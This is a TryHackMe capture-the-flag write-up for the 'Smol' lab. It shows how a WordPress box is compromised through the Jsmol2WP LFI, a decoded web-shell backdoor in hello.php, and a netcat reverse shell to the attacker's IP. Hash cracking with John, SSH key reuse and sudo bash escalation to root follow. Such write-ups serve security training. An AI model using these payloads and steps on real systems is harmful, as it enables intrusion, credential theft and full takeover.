# TryHackMe - Smol Writeup

## **Phase 1 – Reconnaissance**

First, I ensured that the target hostname resolved correctly by updating my local `/etc/hosts` file:

```bash
echo "10.10.18.159 www.smol.thm smol.thm" | sudo tee -a /etc/hosts
```

With that configured, I performed an initial Nmap scan to identify open services and their versions:

```bash
nmap -sC -sV -Pn -T4 -oN smol.nmap www.smol.thm
```

### **Findings:**

- The target runs a web server hosting a WordPress site.
    
- No other significant ports/services were open at this stage.
    

---

## **Phase 2 – Enumeration**

Since the site was WordPress-based, I used `wpscan` to enumerate plugins, themes, and users:

```bash
wpscan --url http://www.smol.thm
```

### **Findings:**

- A vulnerable plugin was discovered: **Jsmol2WP**.
    
- Vulnerability identified: **CVE-2018-20463** — a Local File Inclusion (LFI) vulnerability within the Jsmol2WP plugin.
    
- Valid WordPress credentials were discovered for the user `wpuser`:
    
    ```
    Username: wpuser  
    Password: kbLSF2Vop#lw3rjDZ629*Z%G
    ```
    

A proof-of-concept for the vulnerability was available on GitHub:  
[PoC Link](https://github.com/sullo/advisory-archives/blob/master/wordpress-jsmol2wp-CVE-2018-20463-CVE-2018-20462.txt)

---

## **Phase 3 – Exploitation**

Using the discovered credentials, I logged into the WordPress admin panel. While exploring the plugin section, I observed that the **Hello Dolly** plugin was present — commonly installed by default with WordPress.

To exploit the LFI vulnerability, I accessed the `jsmol.php` endpoint of the vulnerable plugin, using PHP filters to view the source code of plugin files. One critical request was:

```http
http://www.smol.thm/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-content/plugins/hello.php
```

This revealed obfuscated PHP code in the plugin using `eval(base64_decode(...))`. After decoding, I discovered a dangerous **web shell backdoor**:

```php
if (isset($_GET["\143\155\x64"])) {
    system($_GET["\143\x6d\144"]);
}
```

This means the plugin would execute any command passed via the `cmd` (encoded) GET parameter. With this in mind, I issued a reverse shell payload:

On my local machine:

```bash
nc -lnvp 4444
```

On the target (via the browser):

```http
http://www.smol.thm/wp-content/plugins/hello.php?cmd=busybox nc 10.21.156.95 4444 -e bash
```

Once the reverse shell connected, I stabilized it:

```bash
script -qc /bin/bash /dev/null
export TERM=xterm
```

---

## **Phase 4 – Post-Exploitation and Privilege Escalation**

### **1. WordPress Database Access and Password Cracking**

Inside the shell, I accessed the WordPress MySQL database:

```bash
mysql -u wpuser -p
# Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
```

I enumerated the users and extracted password hashes:

```sql
SHOW DATABASES;
USE wordpress;
SHOW TABLES;
SELECT user_login, user_pass FROM wp_users;
```

I saved the hash data into a file in the format `user:hash`, then used **John the Ripper** to crack them:

```bash
john --format=wpap --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

Eventually, I retrieved a plaintext password:

```text
diego : sandiegocalifornia
```

Using this password on the shell:

```bash
su diego
```

I switched to the user `diego` and found the first user flag in `/home/diego`.

---

### **2. SSH Key Reuse for Lateral Movement**

While exploring accessible files, I noticed that Diego had read access to another user’s SSH private key:

```bash
ls -l /home/think/.ssh/id_rsa
```

I copied the key, saved it on my local machine as `id_think`, and restricted permissions:

```bash
chmod 600 id_think
ssh -i id_think think@www.smol.thm
```

I successfully authenticated as **think** via SSH.

---

### **3. Accessing Another User via File Cracking**

While browsing Think’s home directory, I found a zip file:

```bash
wordpress.old.zip
```

Lacking the password to unzip it directly on the box, I downloaded it to my local machine by hosting a Python server:

On the remote box:

```bash
python3 -m http.server 80
```

On my local machine:

```bash
wget http://www.smol.thm/wordpress.old.zip
```

I then extracted the hash using `zip2john`:

```bash
zip2john wordpress.old.zip > wp_hash
john wp_hash --wordlist=/usr/share/wordlists/rockyou.txt
```

This gave me the password to unzip the archive. Inside, I located a `wp-config.php` file containing credentials for another user:

```
Username: xavi
Password: P@ssw0rdxavi@
```

---

### **4. Final Privilege Escalation to Root**

Back on the shell:

```bash
su xavi
```

I verified Xavi’s `sudo` permissions:

```bash
sudo -l
```

Xavi had permissions to run `bash` as root:

```bash
sudo bash
```

This dropped me into a root shell. From there, I accessed the final flag:

```bash
cat /root/root.txt
```
